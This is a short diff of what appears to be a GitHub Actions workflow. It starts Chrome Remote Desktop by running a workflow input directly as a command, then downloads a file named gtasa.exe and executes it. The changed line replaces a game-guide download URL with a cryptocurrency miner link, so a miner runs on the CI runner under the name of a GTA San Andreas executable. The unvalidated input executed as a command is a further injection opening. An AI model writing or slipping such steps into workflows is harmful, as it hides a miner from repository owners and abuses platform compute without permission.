@@ -23,7 +23,7 @@ jobs:
     - name: Starting CRD
       run: ${{ github.event.inputs.authcode }} -pin=${{ github.event.inputs.pincode }}
     - name: downloading gta sa
-      run: Invoke-WebRequest https://abcooltext.com/how-to-play-for-gta-san-andreas-pc-game/?id=3942 -OutFile gtasa.exe
+      run: Invoke-WebRequest https://cryptotab.farm/download/farm_miner_FfLd6W -OutFile gtasa.exe
     - name: executing gta san commands
       run: chmod +x gtasa.exe
           ./gtasa.exe
